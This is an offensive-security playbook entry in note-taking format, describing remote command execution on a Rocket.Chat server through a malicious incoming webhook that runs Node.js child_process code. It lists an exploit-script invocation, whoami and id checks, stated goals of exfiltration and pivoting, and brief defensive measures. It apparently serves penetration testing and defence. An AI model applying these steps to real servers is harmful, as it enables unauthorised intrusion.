---
tags:
  - rce
  - command-execution
type: procedure
tools:
  - '[[tools/Python3]]'
  - '[[tools/requests]]'
  - '[[tools/post_auth_nosqli.py]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/python3-post-auth-nosqli]]'
  - '[[commands/whoami-verification]]'
  - '[[commands/id-verification]]'
verified: false
platforms:
  - Linux
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:46:14.810Z'
skill_level: intermediate
impact_level: critical
detection_risk: high
sub_techniques: []
id: 62744655-514e-4af2-addb-757fc4c529c6
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Execute-Commands-via-Webhook-for-RCE

## Summary

This procedure triggers the malicious webhook with payloads to execute system commands in the context of the Rocket.Chat server process (rocketchat user).

## Description

POST to the webhook URL with JSON payloads containing JS that runs Node.js child_process.exec for commands. No sandboxing allows full RCE. Requires created webhook. Outcome: Arbitrary command execution on server.

## Requirements

1. Malicious webhook URL
2. Payloads for command execution
3. Target commands prepared

## Defense

Defensive measures and detection strategies:

- Disable or sandbox incoming webhooks
- Log all webhook invocations and payloads
- Run Rocket.Chat in a container with limited privileges
- Monitor process for anomalous executions

## Objectives

1. Achieve RCE as server user
2. Verify access with commands
3. Exfiltrate or pivot from server

## Instructions

### Step 1: Trigger Webhook for RCE

**Context**: Send payload to execute commands via JS in webhook.

**Command** ([[commands/python3-post-auth-nosqli]]):
```bash
python3 post_auth_nosqli.py -u attacker -p attacker 'http://localhost:3000'
```

> Script triggers webhook with RCE payloads. Expected output: Command results returned in webhook response.

### Step 2: Verify with whoami

**Context**: Confirm user context.

**Command** ([[commands/whoami-verification]]):
```bash
whoami
```

> Executed via webhook JS. Expected output: 'rocketchat'.

### Step 3: Verify with id

**Context**: Check privileges.

**Command** ([[commands/id-verification]]):
```bash
id
```

> Via webhook. Expected output: uid=65533(rocketchat) gid=65533(rocketchat).

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/python3-post-auth-nosqli]]
- [[commands/whoami-verification]]
- [[commands/id-verification]]

## Tools Used

- [[tools/Python3]]
- [[tools/requests]]
- [[tools/post_auth_nosqli.py]]

## Tags

- rce
- command-execution
